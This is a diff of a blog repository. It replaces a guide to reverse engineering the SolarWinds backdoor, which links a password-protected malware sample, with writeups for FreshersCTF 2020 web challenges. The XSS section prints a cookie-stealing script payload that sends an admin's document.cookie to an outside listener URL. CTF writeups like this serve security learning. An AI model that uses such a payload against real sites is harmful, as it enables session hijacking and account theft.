@@ -1,37 +1,118 @@
 ---
 layout: post
-title:  "Quickly Reversing The SolarWinds Backdoor"
-description: A Quick look into how you might approach reverse engineering the SolarWinds Backdoor.
-date:   2020-12-28 20:27:00 +0000
-categories: SolarWinds RE Threats APT
+title:  "FreshersCTF 2020 Web Challenges Writeups"
+description: Writeup for the challenges in the Web category for the FreshersCTF 2020 ran by ENUSEC. 
+date:   2020-12-27 20:27:00 +0000
+categories: CTF WebApp
 ---
-This is a brief writeup on how to get your hands dirty with reversing the SolarWinds backdoor, some of the tooling required, and where to find it within the backdoored DLL. 
+# Robots go Beep	
 
-The SolarWinds compromise was a sophisticated supply-chain attack, in which it is highly likely the attackers had access to the build-process of SolarWinds Orion - the company's flagship product.
+## Problem
 
-The sample we'll be looking at has a SHA-256 hash of `019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134`.
+We are given a website with a big robot in it and nothing else. Well, the hint is pretty obvious, isn't it?
 
-1. Choose your analysis environment, we recommend using a VM, such as FireEye's Threat Intelligence "ThreatPursuit-VM" which can be found [here](https://github.com/fireeye/ThreatPursuit-VM).
-2. We have provided the malware for analysis here, download the backdoored SolarWinds DLL from here:  [solarwinds_implant.zip](/assets/res/posts/solarwinds/solarwinds_implant.zip). The password is `infected`. You may need to disable Windows Defender, or any other anti-malware solution, if enabled in your analysis environment.
-3. Next, as we're dealing with a .NET binary, we'll use dnSpy (or any other .NET reflector) to decompile the bytecode back to source. Grab the latest release [here](https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip), and extract to a location of your choice.
-4. Start dnSpy, and open the malware - File -> Open. Next, you'll see it opened in the left pane. We can observe several classes within the SolarWinds code, this is expected as the attackers embedded the backdoor code within legitimate SolarWinds-written code - they are likely to of have had presence  in SolarWind's entire build process
-![nvekw.png](/assets/res/posts/solarwinds/nvekw.png)
-5. Now, we'll locate the backdoor code. Go to the `SolarWinds.Orion.Core.BusinessLayer` namespace from the listing.
-6. Next, you'll see a bunch of classes. Select the `OrionImprovementBusinessLayer` class from the listing.
-7. Sick, we've successfully identified the malicous code. 
-![l8rbghqemf.png](/assets/res/posts/solarwinds/l8rbghqemf.png)
-8. Have fun reversing, we highly recommended taking a look at [begin.re](begin.re), and Malware Unicorn's [RE101](https://malwareunicorn.org/workshops/re101.html#0) if you want to learn more. 
+If this isn't obvious for you because you are barely starting, wikipedia says [robots.txt, is a standard used by websites to communicate with web crawlers and other web robots](https://en.wikipedia.org/wiki/Robots_exclusion_standard) 
 
-# Detection
-FireEye released a whole host of YARA rules (and more), to detect this specific threat. This can be found [here](https://github.com/fireeye/sunburst_countermeasures/blob/main/all-yara.yar#L6-L23).
+![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/robots_go_beep_1.png)
 
-## Boring Stuff
-The information contained in this website is for general information purposes only. The information is provided by ENUSEC and while we endeavour to keep the information up to date and correct, we make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability or availability with respect to the website or the information, products, services, or related graphics contained on the website for any purpose. Any reliance you place on such information is therefore strictly at your own risk.
+## Solution
 
-In no event will we be liable for any loss or damage including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this website.
+We only need to check /robots.txt to follow the clue.
 
-Through this website you are able to link to other websites which are not under the control of ENUSEC. We have no control over the nature, content and availability of those sites. The inclusion of any links does not necessarily imply a recommendation or endorse the views expressed within them.
+![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/robots_go_beep_2.png)
 
-Every effort is made to keep the website up and running smoothly. However, ENUSEC, takes no responsibility for, and will not be liable for, the website being temporarily unavailable due to technical issues beyond our control.
+Another hint, this time about the sitemap! We know what to do, don't we? [Wiki site about sitemaps](https://en.wikipedia.org/wiki/Site_map)
 
-`Author: @LloydLabs`
+![3](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/robots_go_beep_3.png)
+
+# Saucy
+
+## Problem
+
+We are given a website containing a yummy tomato sauce picture. I personally went mad overcomplicating this one trying to steganography the hell out of the picture without any result.
+
+## Solution
+
+Then I realised `saucy` was a hint towards `source` (code), so I double-checked and there it was:
+
+![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/saucy1.png)
+
+That easy, just go to that folder. Note to future-self: try and get the low hanging fruit first, you *dummy*!
+
+![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/saucy2.png)
+
+# Not Java
+
+## Problem
+
+```
+Ooops.
+
+Looks like the developers of this Authentication system left a huge gigantic gaping hole in the application.
+
+Can you exploit their incompetence?
+```
+
+We are presented a dull login page. 
+
+Exactly as it happened to me with Saucy, happened to me with "Not Java". 
+
+I realised the solution at the time the CTF was about to finish. I guess some pressure helps me thinking!
+
+## Solution
+
+If we stop trying to bruteforce the login form for a minute and check the script running in the page, we find it's calling a function to log us in. That function is checking parameters and then calling another function: `logIn("")`. The only thing we need to do is calling it in the devtools console and we'll get the door wide open!.
+
+![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/not_java_1.png)
+
+![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/not_java_2.png)
+
+We get redirected to our flag straight away:
+
+![3](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/not_java_3.png)
+
+# KFF
+
+## Problem
+
+```
+This encoding application seems to have a massive oversight.
+
+Can you exploit it and steal the Admins session?
+```
+
+We get a big lock image with two prompts that encode a message, one for viewing ourselves our encoded message and another one to send the encryped message to the admin. 
+Smells like [XSS](https://owasp.org/www-community/attacks/xss/), doesn't it?
+
+## Solution
+
+Let's try to encode some messages. If we say `hello`, we receive `ifmmp`. It looks like we have a [ROT13](https://en.wikipedia.org/wiki/ROT13) variant cipher instead of an encoding, right?. 
+
+![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_1.png)  
+
+However, if we try with symbols, they also rotate, therefore we are talking about a variant of [ROT47](https://en.wikipedia.org/wiki/ROT13#Variants) encryption with a rotation we don't know yet.
+
+![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_2.png)
+
+We can use [Cyberchef](https://gchq.github.io/CyberChef/)'s ROT47 tool to play around with the ciphertext until we decrypt it:
+
+![3](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_6.png)
+
+We find the ciphertext being decrypted as ROT1 but what we actually need is the oposite to correctly encrypt our payload:
+
+![4](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_7.png)
+
+We finally discover the encryption is ROT-1 (ROT47(-48)). Let's try then to get some XSS working!
+
+![5](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_4.png)
+
+... And we were right!!!
+
+Now that we finally have our PoC working, we need to send the payload to the admin in order to steal their session cookie. We can do this with the following payload, where `document.location=<our website>?cookie=` is the listening server we control with a cookie request URL encoded and `document.cookie` is the cookie we want to steal from the admin:  
+
+```
+<script>document.location="https://enx0ouxtov1d1z8.m.pipedream.net?cookie="+document.cookie;</script>
+```
+![6](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_5.png)
+
+`Author: @0x5ubt13`
